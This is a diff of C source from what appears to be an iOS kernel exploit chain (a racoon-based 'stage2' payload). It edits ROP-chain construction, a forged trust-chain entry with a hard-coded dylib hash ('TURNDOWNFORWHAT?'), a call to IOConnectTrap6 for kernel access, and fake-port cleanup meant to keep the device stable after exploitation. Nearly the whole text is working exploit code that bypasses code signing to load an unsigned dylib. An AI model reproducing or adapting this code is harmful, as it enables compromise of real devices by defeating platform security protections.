@@ -663,7 +663,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
 
-#if 1
+#if 0
 
 	char * dylib_str = malloc(100);
 	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
@@ -851,12 +851,12 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	hash_t my_dylib_hash = {0x88,0xd1,0x7f,0x3e,0x27,0x42,0x76,0x09,0xaa,0xb9,0xbb,0xee,0xb1,0xfb,0x21,0x27,0x1f,0xc5,0x57,0xa3};
+	hash_t my_dylib_hash = {0xa3,0xdf,0xd1,0xe7,0xe3,0x89,0x3c,0xeb,0x9a,0x34,0xf4,0x4d,0x7a,0x7b,0x09,0xce,0xf4,0x28,0x7a,0xf8};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
 	char * dylib_str = malloc(100);
-	snprintf(dylib_str,100,"/usr/lib/racoon.dylib");
+	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
 	DEFINE_ROP_VAR("dylib_str",100,dylib_str);
 
 	char * wedidit_msg = malloc(1024);
@@ -1215,7 +1215,7 @@ _STRUCT_ARM_THREAD_STATE64
 	char * name = "vm.swapfileprefix";
 	int name2oid[2] = {0,3};
 	int * real_oid = malloc(CTL_MAXNAME+2);
-	size_t oidlen;
+	size_t oidlen = CTL_MAXNAME+2;
 	sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name));
 	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
 	ROP_VAR_ARG_HOW_MANY(3);
@@ -1300,9 +1300,13 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("bss_trust_chain_head_ptr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 
-	ADD_LOOP_START("wait");
-		ADD_USLEEP(100);
-	ADD_LOOP_END();
+	// fixup fakeport so that in case we crash the system remains stable
+    SET_ROP_VAR64_W_OFFSET("fakeport",0,offsetof(kport_t,ip_bits));
+    SET_ROP_VAR64_W_OFFSET("fakeport",0,offsetof(kport_t,ip_kobject));
+    ROP_VAR_ARG_HOW_MANY(2);
+    ROP_VAR_ARG64("self",1)
+    ROP_VAR_ARG64("the_one",2);
+    CALL("mach_port_deallocate",0,0,0,0,0,0,0,0);
 
 	// ghetto dlopen
 	// get a file descriptor for that dylib
